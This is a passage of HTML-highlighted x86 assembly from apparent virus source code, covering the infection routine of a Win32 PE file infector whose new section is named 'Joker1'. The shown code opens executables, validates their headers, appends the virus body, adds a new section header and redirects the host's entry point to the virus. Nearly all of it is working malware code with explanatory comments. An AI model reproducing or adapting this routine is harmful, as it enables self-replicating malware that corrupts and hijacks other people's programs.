        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SearchHandle</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EBX = Search handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">

        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">ExitFindNextFil</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; EAX = 0 (Exit with error)</span><span class="sc0">

</span><span class="sc5">ExitFindNextFil</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0"> 

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Infect the found file</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">InfectFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenFile</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">continue_inf</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0"> 

</span><span class="sc5">continue_inf</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Store File Handle</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">; ECX = 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">; Read 400h bytes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadFromFile</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">inf_stage2</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckValidPE</span><span class="sc0">

</span><span class="sc5">inf_stage2</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">InfError1</span><span class="sc0">               </span><span class="sc1">; Error? Damn...</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSizeHigh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; FileSizeHigh = 0?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">InfError1</span><span class="sc0">               </span><span class="sc1">; If so, too much great for us</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSizeLow</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">7FFFEFFFh</span><span class="sc0"> </span><span class="sc1">; File too huge? Shit!</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">InfError1</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@3</span><span class="sc0">
</span><span class="sc5">@@3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">                </span><span class="sc1">; EAX = Offset where jump</span><span class="sc0">

</span><span class="sc5">call_jump_eax</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">jump_eax</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Joker1"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; The name of the new section</span><span class="sc0">

</span><span class="sc5">jump_eax</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Remove shit from stack</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; Save ESI</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; EAX = ESI</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; EDI = Beginning of file header</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; Search 400h bytes</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">InfError1</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; AX = Number of sections</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">                            </span><span class="sc1">; Convert Word to DoubleWord</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">; EDI = Pointer to last section</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Ptr2LastSection</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; EBX = SizeOfRawData</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; EBX = Raw pointer to end of last section</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; EAX = EBX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ECX = File Alignment</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Here it aligns that value</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; EDX = 0</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; EAX = Aligned value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; EDX = EAX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ASizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; Save it in a variable</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">                </span><span class="sc1">; Convert this to usable by the function</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; Move pointer to where we want</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MoveFilePointer</span><span class="sc0">         </span><span class="sc1">; Do it</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">ContinueInf</span><span class="sc0">

</span><span class="sc5">InfError1</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">InfError</span><span class="sc0">

</span><span class="sc5">ContinueInf</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PushImm32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0"> </span><span class="sc1">; Put PUSH imm8 opcode</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; EDX = EIP of host</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEIP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">       </span><span class="sc1">; Store after push opcode</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PushImm32</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">; ECX = 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                   </span><span class="sc1">; ECX = 5</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write2File</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">Continue2</span><span class="sc0">               </span><span class="sc1">; Jump over this if no error</span><span class="sc0">

</span><span class="sc5">InfError</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CloseAndQuit</span><span class="sc0">            </span><span class="sc1">; Shit...</span><span class="sc0">

</span><span class="sc5">Continue2</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virus_size</span><span class="sc0">         </span><span class="sc1">; EAX = Virus Size</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; EAX--</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; EDX = 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ECX = Alignment factor</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">; Now the virus aligns the virus size</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AVirusSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">; And saves it into its variable</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                  </span><span class="sc1">; We substract 5 (for PUSH imm32)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_virus</span><span class="sc0">

</span><span class="sc5">call_data</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">virus_start</span><span class="sc0">

</span><span class="sc5">write_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; EDX = Points to call_data</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Add the call address</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">                </span><span class="sc1">; EDX = Data to write</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write2File</span><span class="sc0">              </span><span class="sc1">; Write virus body :)</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; Save ESI</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Ptr2LastSection</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EDI = Pointer after last section</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">                </span><span class="sc1">; EDI = EDI+28h (size of section header)</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@2</span><span class="sc0">
</span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">                  </span><span class="sc1">; Jump after this shit, but for one</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_jump_eax</span><span class="sc0">           </span><span class="sc1">; reason... it returns us in the stack</span><span class="sc0">
                                        </span><span class="sc1">; a pointer to the name of the new</span><span class="sc0">
                                        </span><span class="sc1">; section :)</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; ESI = Points to "Joker1\0\0"</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">; We put the name of the new section</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">; It occupies 8 bytes, so... :)</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; Restore old ESI value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AVirusSize</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; EAX = Aligned virus size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ECX = Section's alignment</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">                             </span><span class="sc1">; EDX = 0</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Align virus size to section alignment</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">; Section's VirtualSize</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Here the virus perform the</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; necessary actions to know</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; section's new VirtualAddress</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">; Section's VirtualAddress</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Store it in stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virus_size</span><span class="sc0">         </span><span class="sc1">; EAX = VirusSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">                             </span><span class="sc1">; EDX = 0</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">; Section's SizeOfRawData</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ASizeOfRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">; Section's PointerToRawData</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; EAX = 0</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">; Section's PointerToRelocations</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">; Section's PointerToLineNumbers</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">; Section's NumberofRelocations</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20000020h</span><span class="sc0">          </span><span class="sc1">; Section's attributes</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">; (Text, Writable)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">40h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; ESI = Pointer to file header</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; EAX = New section's VirtualAddress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Set it as new EntryPoint</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Increase number of sections</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AVirusSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Add to SizeOfCode the aligned virus size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; EBX = Old SizeOfImage</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; EAX = Aligned virus size+SizeOfImage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ECX = SectionAlignment</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Align VirusSize+SizeOfCode</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; to the SectionAlignment</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Store the new SizeOfImage</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; EDX = 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; ECX = 0</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; AL = 0 (Ptr to wanted position)</span><span class="sc0">
